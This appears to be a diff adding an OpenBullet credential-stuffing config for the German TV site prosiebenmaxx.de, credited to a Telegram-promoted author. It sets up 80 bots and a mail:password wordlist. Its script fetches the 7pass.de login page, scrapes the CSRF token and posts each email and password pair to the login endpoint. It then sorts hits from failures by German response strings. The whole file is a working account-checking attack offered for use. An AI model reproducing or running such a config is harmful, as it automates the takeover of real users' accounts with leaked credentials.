@@ -1,0 +1,98 @@
+[SETTINGS]
+{
+  "Name": "prosiebenmaxx.de",
+  "SuggestedBots": 80,
+  "MaxCPM": 0,
+  "LastModified": "2021-06-03T22:16:51.3753717+04:30",
+  "AdditionalInfo": "Telegram Channel: https://t.me/OpenBulletChannel",
+  "Author": "@Hogo_Victor",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Author Telegram Id:@Hogo_Victor",
+      "VariableName": "",
+      "Id": 882203879
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get REQUEST GET "https://op.7pass.de/auth?client_id=5e623e8cbdeee25f5819762e&scope=openid%20profile%20email%20offline_access&response_type=code&redirect_uri=https%3A%2F%2Fmira.prosiebenmaxx.de%2Fsso%2Fauth%2Fcallback&code_challenge=sORnXhPKwDZEAdvq0HlIR7S1vfOfKUANiAzzO4ZzNu0&code_challenge_method=S256&state=470ff5412e8acd343f2d0bdae4ce73d5&prompt=consent&cd02=n%2Fa&cd03=n%2Fa&cd04=n%2Fa&cd05=n%2Fa&cd18=n%2Fa&cd21=n%2Fa&cd24=frontpage&cd29=n%2Fa&cd45=Not%20logged%20in&cd55=n%2Fa&cd59=oeu1622739209545r0.07347245446888984&cd60=n%2Fa&cd61=Web_ProSieben%20MAXX&cd62=Windows&cd63=Desktop&cd64=https%3A%2F%2Fwww.prosiebenmaxx.de%2F&cd65=false&utm_campaign=n%2Fa&utm_medium=n%2Fa&utm_source=n%2Fa&utm_content=n%2Fa&utm_term=n%2Fa&dl=https%3A%2F%2Fwww.prosiebenmaxx.de%2F&dp=%2F&dt=ProSieben%20MAXX%20-%20TV-Programm%2C%20Ganze%20Folgen%2C%20Stream&tld=DE&cmpUcId=78c7034bd43a1f72eaaf1bb802e3cd3e68f875a998f28e416b6fd6dc8c77d604&cmpUcInstance=VhdL5rzsy" 
+  
+  HEADER "Host: op.7pass.de" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Referer: https://www.prosiebenmaxx.de/" 
+  HEADER "Dnt: 1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: close" 
+
+#csrf-param PARSE "<SOURCE>" LR "<meta name=\"csrf-param\" content=\"" "\"" -> VAR "csrf-param" 
+
+#csrf-token PARSE "<SOURCE>" LR "<meta name=\"csrf-token\" content=\"" "\"" -> VAR "csrf-token" 
+
+#Login REQUEST POST "https://interaction.7pass.de/da94c7da-7b06-4dab-8e53-d2956a43e6c5/login" EncodeContent=TRUE 
+  CONTENT "<csrf-param>=<csrf-token>&email=<USER>&password=<PASS>&remember=on" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: interaction.7pass.de" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Origin: https://interaction.7pass.de" 
+  HEADER "Dnt: 1" 
+  HEADER "Referer: https://interaction.7pass.de/da94c7da-7b06-4dab-8e53-d2956a43e6c5/login" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Bitte gib ein gültiges Passwort ein." 
+  KEYCHAIN Success OR 
+    KEY "Willkommen bei ProSieben" 
+
+#Telegram_Channel FUNCTION Constant "https://t.me/OpenBulletChannel" -> CAP "Telegram Channel" 
+
